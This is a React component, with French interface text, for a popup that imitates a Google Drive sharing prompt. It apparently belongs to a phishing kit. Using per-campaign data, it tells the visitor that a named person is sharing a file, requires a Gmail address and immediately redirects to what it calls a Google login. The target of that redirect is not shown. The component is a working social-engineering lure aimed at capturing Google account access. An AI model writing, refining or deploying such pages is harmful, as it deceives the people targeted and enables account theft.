import React, { useState } from 'react';
import BasePopup from '../common/BasePopup';
import { validateGmailAddress } from '../../utils/validation';
import { redirectToGoogleLogin } from '../../utils/redirect';
import styles from '../../styles/components/CommonPopup.module.css';

/**
 * Popup d'autorisation pour la landing Drive
 * Demande seulement l'email et redirige immédiatement
 */
const DrivePopup = ({ isVisible, onClose, campaignData }) => {
  const [email, setEmail] = useState('');
  const [emailError, setEmailError] = useState('');
  const [isRedirecting, setIsRedirecting] = useState(false);

  const handleEmailChange = (e) => {
    const value = e.target.value.trim();
    setEmail(value);
    
    // Réinitialiser l'erreur au changement
    if (emailError) {
      setEmailError('');
    }
  };

  const handleSubmit = (e) => {
    e.preventDefault();
    
    // Validation
    if (!email) {
      setEmailError('Veuillez saisir votre adresse email');
      return;
    }
    
    if (!validateGmailAddress(email)) {
      setEmailError('Merci d\'utiliser une adresse Gmail compatible.');
      return;
    }
    
    setIsRedirecting(true);
    
    // Redirection immédiate
    redirectToGoogleLogin({
      email,
      campaign: campaignData?.id
    });
  };

  return (
    <BasePopup isVisible={isVisible} onClose={onClose}>
      <div className={styles.content}>
        <div className={styles.iconContainer}>
          <img 
            src="https://static.vecteezy.com/system/resources/previews/012/871/368/non_2x/google-drive-icon-google-product-illustration-free-png.png"
            alt="Google Drive"
            className={styles.miniHeaderIcon}
          />
        </div>
        
        <h3 className={styles.title}>
          Autorisation nécessaire
        </h3>
        
        <p className={styles.subtitle}>
          Ce fichier nécessite une autorisation pour y accéder.
        </p>

        <p className={styles.description}>
          {campaignData?.firstName && campaignData?.lastName
            ? `${campaignData.firstName} ${campaignData.lastName} souhaite partager ce fichier avec vous. Connectez-vous à votre compte Google pour l'ouvrir.`
            : 'Ce fichier vous a été partagé. Connectez-vous à votre compte Google pour l\'ouvrir.'
          }
        </p>

        <form onSubmit={handleSubmit} className={styles.form}>
          <div className={styles.inputGroup}>
            <input
              type="email"
              value={email}
              onChange={handleEmailChange}
              placeholder="votre.email@gmail.com"
              className={`${styles.input} ${emailError ? styles.inputError : ''}`}
              disabled={isRedirecting}
              autoFocus
            />
            {emailError && (
              <div className={styles.errorMessage}>
                {emailError}
              </div>
            )}
          </div>
          
          <div className={styles.buttonContainer}>
            <button 
              type="submit"
              className={styles.primaryButton}
              disabled={isRedirecting}
            >
              {isRedirecting ? 'Redirection...' : 'Accéder au fichier'}
            </button>
          </div>
        </form>
      </div>
    </BasePopup>
  );
};

export default DrivePopup; 